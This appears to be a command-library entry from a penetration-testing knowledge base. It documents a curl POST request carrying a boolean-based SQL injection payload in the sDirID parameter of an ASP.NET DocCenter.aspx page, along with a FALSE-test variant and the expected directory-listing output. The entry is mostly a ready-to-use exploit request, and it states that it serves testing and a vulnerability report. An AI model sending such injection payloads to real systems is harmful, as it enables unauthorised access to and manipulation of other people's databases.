---
data: >-
  curl -X POST /DocCenter.aspx HTTP/1.1 -H 'Content-Type:
  application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H
  'Referer: https://target/' -H 'Cookie: ASP.NET_SessionId=example' -H 'Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  'Accept-Encoding: gzip,deflate' -H 'Content-Length: 1031' -H 'User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
  Gecko) Chrome/88.0.4298.0 Safari/537.36' -H 'Host: target' -H 'Connection:
  Keep-alive' -d 'param1=value& EVENTARGUMENT=-|public|GetDirs&
  EVENTTARGET=ResourceManager1&
  EVENTVALIDATION=oSBfIwV8vHrmOrmbrTnFRCqXUL/aKiWgwUHyEAR99v8UPlosE+oGKWAXIyeVlw6XRDeycmf020z48gy5+WyZMfDNWeC00FVAC4Bfg6/TkHzFdksbhJywKOVC0yTqOA2uNp5XjQ==&
  VIEWSTATE=example& VIEWSTATEENCRYPTED=&
  VIEWSTATEGENERATOR=3257FB69&submitDirectEventConfig={"config":{"extraParams":{"sDirID":"-1
  OR 3*2*1=6 AND 000159=000159"}}}&txtSearchBox=the'
tags:
  - sqli
  - http-post
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.098Z'
id: f0833924-9d78-4d13-b3cf-a451d1445f19
verified: false
validated: true
submitted: true
---
# post-sqli-boolean-payload-initial

## Command

```bash
curl -X POST /DocCenter.aspx HTTP/1.1 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://target/" \
  -H "Cookie: ASP.NET_SessionId=example" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Encoding: gzip,deflate" \
  -H "Content-Length: 1031" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" \
  -H "Host: target" \
  -H "Connection: Keep-alive" \
  -d 'param1=value& EVENTARGUMENT=-|public|GetDirs& EVENTTARGET=ResourceManager1& EVENTVALIDATION=oSBfIwV8vHrmOrmbrTnFRCqXUL/aKiWgwUHyEAR99v8UPlosE+oGKWAXIyeVlw6XRDeycmf020z48gy5+WyZMfDNWeC00FVAC4Bfg6/TkHzFdksbhJywKOVC0yTqOA2uNp5XjQ==& VIEWSTATE=example& VIEWSTATEENCRYPTED=& VIEWSTATEGENERATOR=3257FB69&submitDirectEventConfig={"config":{"extraParams":{"sDirID":"-1 OR 3*2*1=6 AND 000159=000159"}}}&txtSearchBox=the'
```

## Description

Sends an initial POST request to exploit SQLi in the sDirID parameter using a boolean TRUE payload. Used for testing and reproduction in the vulnerability report.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| EVENTTARGET | Targets ResourceManager1 event | Yes |
| EVENTARGUMENT | Specifies GetDirs action | Yes |
| VIEWSTATE | ASP.NET form state | Yes |
| EVENTVALIDATION | Validation token | Yes |
| submitDirectEventConfig | JSON with sDirID payload | Yes |
| txtSearchBox | Search value | No |

## Examples

### Basic Usage

```bash
curl -X POST https://target/DocCenter.aspx -d '...' # As above
```

### Advanced Usage

Modify sDirID for FALSE test: replace payload with '-1 OR 3*2=5 AND 000159=000159'

## Expected Output

HTTP response with manipulated query results, such as full directory listing if TRUE, or empty if FALSE. No SQL errors.

## Related

- [[commands/post-sqli-boolean-payload-followup]]
- [[procedures/Craft-and-Test-Boolean-Based-SQL-Injection-Payloads]]
